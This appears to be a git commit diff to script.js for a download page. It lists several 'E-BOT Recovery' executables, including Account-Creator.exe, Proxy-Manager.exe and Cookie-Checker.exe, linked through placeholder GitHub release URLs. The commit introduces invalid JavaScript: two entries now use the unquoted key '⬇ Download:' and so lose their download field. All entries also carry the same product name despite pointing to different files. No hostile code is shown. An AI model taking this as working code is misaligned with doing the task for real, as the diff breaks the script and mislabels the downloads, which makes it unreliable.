4f82de3024b67b350765f28a5e2273f3054666e9
mmehedim <121457696+mmehedim@users.noreply.github.com>
2026-07-18 15:40:39 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,44 +1,35 @@
 const software = [
 
 {
-    name:"📂 E-BOT Recovery",
-    version:"v1.0.0",
+    program:"📂 E-BOT Recovery",
+    version:"2.1.0",
     size:"152 MB",
     released:"18 Jul 2026",
     download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v2.1.0/E-BOT-Recovery.exe"
 },
 
 {
-    name:"📂 E-BOT Recovery",
-    version:"v1.0.0",
+    program:"📂 E-BOT Recovery",
+    version:"1.5.2",
     size:"149 MB",
     released:"16 Jul 2026",
     download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v1.5.2/Account-Creator.exe"
 },
 
 {
-    name:"📂 E-BOT Recovery",
-    version:"v1.0.0",
+    program:"📂 E-BOT Recovery",
+    version:"3.0",
     size:"138 MB",
     released:"10 Jul 2026",
-    download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v3.0/Proxy-Manager.exe"
+    ⬇ Download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v3.0/Proxy-Manager.exe"
 },
 
 {
-    name:"📂 E-BOT Recovery",
-    version:"v1.0.0",
-    size:"138 MB",
-    released:"10 Jul 2026",
-    download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v3.0/Proxy-Manager.exe"
-},
-
-    
-{
-    name:"📂 E-BOT Recovery",
-    version:"v1.0.0",
+    program:"📂 E-BOT Recovery",
+    version:"4.4",
     size:"157 MB",
     released:"03 Jul 2026",
-    download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v4.4/Cookie-Checker.exe"
+    ⬇ Download:"https://github.com/USERNAME/e-bot-download-page/releases/download/v4.4/Cookie-Checker.exe"
 }
 
 ];
@@ -51,7 +42,7 @@ table.innerHTML += `
 
 <tr>
 
-<td>${item.name}</td>
+<td>${item.program}</td>
 
 <td>${item.version}</td>
 
